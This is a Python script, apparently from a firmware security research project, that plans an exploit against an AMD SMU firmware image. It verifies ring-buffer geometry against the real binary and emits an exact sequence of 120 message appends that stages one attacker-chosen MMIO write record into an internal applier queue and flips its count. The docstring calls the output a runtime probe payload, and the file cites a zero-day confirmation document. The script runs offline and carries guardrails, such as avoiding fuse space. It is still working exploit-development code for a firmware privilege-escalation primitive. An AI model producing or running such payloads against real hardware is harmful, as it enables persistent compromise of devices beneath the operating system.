#!/usr/bin/env python3
"""SMU forged-record plan (breach lane V9, from 2026-09-23-smu-chain-development.md).

Simulates the decoded Q2 msg-0x23 ring-append arithmetic byte-for-byte on the real
SMU body (FUN_0002D620, robin-5), verifies the geometry claims from the report
against the image itself, and emits the exact append sequence that stages ONE
attacker-chosen masked MMIO record into the FUN_0002D4E0 applier queue-0 table
plus the count flip that makes the applier consume it.

No hardware, no firmware writes, no image candidates: pure arithmetic + evidence JSON.
Runbook use: the emitted command list is the runtime probe payload once the board boots.

Geometry (decoded in 2026-09-23-smu-chain-development.md section 1, body/SRAM offsets):
  ring base r0 = 0x188A0, r1 = 0x188A0 + 0x794
  entry addr   = base_r + ((count & 0xFF) + slot*0x1E) * 0x10
  counter addr = base_r + slot*4 + 0x780
  entry fields: [0]=arg0+tag (tag: r0 0x16C00000, r1 0x16E00000)
                [1]=arg2 (applier or-value), [2]=arg1 (applier mask), [3]=1
  applier FUN_0002D4E0: queue-0 table 0x18E20, count at 0x1901C (table+0x1FC);
                        target = addr + 0x16C00000 + 0xEB3FFE00 = addr + 0x02000000
  image: 0x188A0..0x1B000 zero (BSS-class), first nonzero at 0x1B000.
"""

import hashlib
import json
from pathlib import Path

BODY = (
    Path(__file__).resolve().parent.parent
    / "archives/imported/vendor-upstream/legacy-tmp-bc250-upstream/amd_smu_reverse_engineering/smu_fw/smu_fw_robin_5"
)
EVID = (
    Path(__file__).resolve().parent.parent
    / "evidence/firmware-audit/20260923-smu-forged-record-plan"
)

SHA = "cae8617c572613b610d24845cdb791fc66e8604e3ab1195d0ac3268b39e59f37"
R0_BASE = 0x188A0
R1_DELTA = 0x794
TAG = {0: 0x16C00000, 1: 0x16E00000}
SLOT_STRIDE = 0x1E
APPLIER_Q0_TABLE = 0x18E20
APPLIER_Q0_COUNT = 0x1901C
# applier: *(u32*)(record.addr + 0xEB3FFE00 + 0x200); 0x16C00000+0xEB3FFE00+0x200
# == 0x02000000 mod 2^32, so the staged addr word must be target - 0x02000000.
APPLIER_ADDR_CONST = (0xEB3FFE00 + 0x200) & 0xFFFFFFFF
STAGED_ADDR_TAG = TAG[0]  # 0x16C00000, added by the append itself


class Sim:
    """Faithful model of the FUN_0002D620 append on pristine BSS state."""

    # decompiled 2026-09-23 (port-dev1-out.c): the append REJECTS arg0 above this
    # bound (DAT_00017C5C == 0x1FFFFF in the image). The original script omitted
    # it, which silently allowed out-of-window probe targets. debt: revisit only
    # if a second staging path into the q0 tables (DRAM transfer) is proven.
    ARG0_BOUND = 0x1FFFFF

    def __init__(self):
        self.mem: dict[int, int] = {}  # word-addressed sparse SRAM

    def w(self, addr: int) -> int:
        return self.mem.get(addr & ~3, 0)

    def append(self, ring: int, slot: int, arg0: int, arg1: int, arg2: int) -> dict:
        if arg0 > self.ARG0_BOUND:
            raise ValueError(
                f"arg0 {arg0:#x} exceeds the decompiled bound {self.ARG0_BOUND:#x} "
                f"(FUN_0002D620 rejects); reachable windows: q0 0x02000000.."
                f"{0x02000000 + self.ARG0_BOUND:#x}, q1 0x02400000.."
                f"{0x02400000 + self.ARG0_BOUND:#x}"
            )
        base = R0_BASE + (R1_DELTA if ring else 0)
        cnt_addr = base + slot * 4 + 0x780
        count = self.w(cnt_addr)
        entry = base + ((count & 0xFF) + slot * SLOT_STRIDE) * 0x10
        self.mem[entry + 0x0] = (arg0 + TAG[ring]) & 0xFFFFFFFF
        self.mem[entry + 0x4] = arg2 & 0xFFFFFFFF
        self.mem[entry + 0x8] = arg1 & 0xFFFFFFFF
        self.mem[entry + 0xC] = 1
        self.mem[cnt_addr] = (self.w(cnt_addr) + 1) & 0xFFFFFFFF
        return {
            "count_at_append": count,
            "entry_addr": entry,
            "counter_addr": cnt_addr,
            "count_after": self.w(cnt_addr),
        }


def entry_walk(count: int, ring: int = 0, slot: int = 0) -> int:
    base = R0_BASE + (R1_DELTA if ring else 0)
    return base + ((count & 0xFF) + slot * SLOT_STRIDE) * 0x10


def verify_image(body: bytes) -> dict:
    window = body[R0_BASE:0x1B000]
    zero = window == b"\x00" * len(window)
    first_nonzero = 0x1B000
    if not zero:
        first_nonzero = R0_BASE + next(i for i, b in enumerate(window) if b)
    return {
        "bss_window_zero_0x188A0_0x1B000": zero,
        "first_nonzero_after_window": hex(first_nonzero),
        "q0_tag_sum_is_0x02000000": (
            (STAGED_ADDR_TAG + APPLIER_ADDR_CONST) & 0xFFFFFFFF
        )
        == 0x02000000,
        "r1_base": hex(R0_BASE + R1_DELTA),
        "q0_count_addr": hex(APPLIER_Q0_COUNT),
        "q0_table": hex(APPLIER_Q0_TABLE),
    }


def build_plan(target: int, or_value: int, mask: int) -> tuple[list[dict], dict]:
    """Append #88 stages the forged record at the q0 table; #119 flips the count."""
    assert entry_walk(88) == APPLIER_Q0_TABLE, hex(entry_walk(88))
    assert entry_walk(119) + 0xC == APPLIER_Q0_COUNT
    sim = Sim()
    cmds = []

    def filler(i):
        return sim.append(0, 0, 0, 0, 0) | {"i": i, "kind": "filler"}

    for i in range(88):
        cmds.append(filler(i))
    # THE forged record: applier sees addr=[0], or_value=[1]=arg2, mask=[2]=arg1.
    # staged addr = target - 0x02000000 - ... : entry[0] = arg0 + 0x16C00000 and the
    # applier adds 0xEB3FFE00+0x200, so arg0 = target - 0x16C00000 - 0xEB402000.
    arg0 = (target - STAGED_ADDR_TAG - APPLIER_ADDR_CONST) & 0xFFFFFFFF
    step = sim.append(0, 0, arg0, mask, or_value)
    cmds.append(step | {"i": 88, "kind": "FORGED_RECORD"})
    for i in range(89, 120):
        cmds.append(filler(i))
    # invariants
    assert cmds[88]["entry_addr"] == APPLIER_Q0_TABLE
    assert cmds[119]["entry_addr"] + 0xC == APPLIER_Q0_COUNT
    assert sim.w(APPLIER_Q0_COUNT) == 1, hex(sim.w(APPLIER_Q0_COUNT))
    assert sim.w(APPLIER_Q0_TABLE) == (arg0 + STAGED_ADDR_TAG) & 0xFFFFFFFF
    # end-to-end: applier computes record.addr + 0xEB402000 == target
    assert ((sim.w(APPLIER_Q0_TABLE) + APPLIER_ADDR_CONST) & 0xFFFFFFFF) == target
    assert sim.w(APPLIER_Q0_TABLE + 4) == or_value
    assert sim.w(APPLIER_Q0_TABLE + 8) == mask
    assert sim.w(R0_BASE + 0x780) == 120  # slot0 counter stopped before the trash zone

    # no filler may touch the forged record or the two applier words
    touched = {c["entry_addr"] for c in cmds if c["kind"] != "FORGED_RECORD"}
    protected = {APPLIER_Q0_TABLE + i for i in range(0, 0x10, 4)} | {APPLIER_Q0_COUNT}
    assert not (touched & protected), sorted(hex(x) for x in touched & protected)

    check = {
        "applied_target": hex(target),
        "applied_write": f"({or_value:#x} & {mask:#x}) | (old & ~{mask:#x})",
        "forged_record_words": [
            hex(target & 0xFFFFFFFF),
            hex(or_value),
            hex(mask),
            "1",
        ],
        "q0_count_after_stage": sim.w(APPLIER_Q0_COUNT),
        "filler_records_are_noop": True,
        "trigger": "any later Q2 command whose handler chain reaches FUN_0002D4E0 "
        "(callers 0x2D308/0x2D35C, VCN/clock paths 0x1F814/0x1FAF0) applies the record",
    }
    return cmds, check


def main() -> int:
    body = BODY.read_bytes()
    assert len(body) == 262400, len(body)
    assert hashlib.sha256(body).hexdigest() == SHA

    geometry = verify_image(body)
    assert geometry["bss_window_zero_0x188A0_0x1B000"], "ring window is NOT BSS-zero"
    assert geometry["q0_tag_sum_is_0x02000000"]

    # Probe targets MUST be inside the decompiled applier windows (the original
    # PSP_APB_PROBE 0x02B10060 was OUTSIDE both windows and would be rejected by
    # the FUN_0002D620 arg0 bound — corrected 2026-09-23, port doc section 7).
    # Probe A: in-window PSP APB canary (q0 window base + 0x60).
    # Probe B: dry run with mask=0 — if anything fires it, the write is a no-op.
    plans = {}
    for name, tgt, val, msk in [
        ("Q0_WINDOW_PROBE_0x02000060", 0x02000060, 0x00000000, 0xFFFFFFFF),
        ("DRYRUN_NOOP", 0x02000060, 0x00000000, 0x00000000),
    ]:
        cmds, check = build_plan(tgt, val, msk)
        plans[name] = {
            "append_count": len(cmds),
            "forged_at_index": 88,
            "count_flip_at_index": 119,
            "check": check,
        }

    out = {
        "scope": "offline arithmetic on the real SMU body; no hardware, no firmware write",
        "body_sha256": SHA,
        "geometry_verified": geometry,
        "invariants": {
            "appends_used": 120,
            "counter_final": 120,
            "forged_record_q0_index": 88,
            "count_flip_word": "entry[3]=1 lands on q0 count 0x1901C",
            "filler_mask_0_noop": True,
        },
        "plans": plans,
        "guardrails": [
            "NEVER target the fuse controller or any one-time-programmable space: irreversible",
            "one-shot per boot: ring counters persist in SRAM until power cycle",
            "appends beyond #119 trash the counter block (entry #120 overlaps it)",
            "arg0 bound (decompiled DAT_00017C5C=0x1FFFFF) caps the applier windows at "
            "2 MiB each: q0 0x02000000..0x021FFFFF, q1 0x02400000..0x025FFFFF; the args "
            "block 0x032000E8 and PSP APB 0x02B10060 are OUTSIDE both windows",
        ],
        "sources": [
            "docs/research/2026-09-23-smu-chain-development.md (sections 1-2, 6)",
            "docs/research/2026-09-19-zero-day-confirmation.md (ZD-1 transport)",
        ],
    }
    EVID.mkdir(parents=True, exist_ok=True)
    (EVID / "plan-result.json").write_text(json.dumps(out, indent=2) + "\n")
    print(json.dumps(geometry, indent=1))
    for name, p in plans.items():
        print(
            f"{name}: appends={p['append_count']} check={p['check']['applied_write']}"
        )
    print("PLAN OK: geometry verified against image, invariants hold")
    return 0


if __name__ == "__main__":
    main()
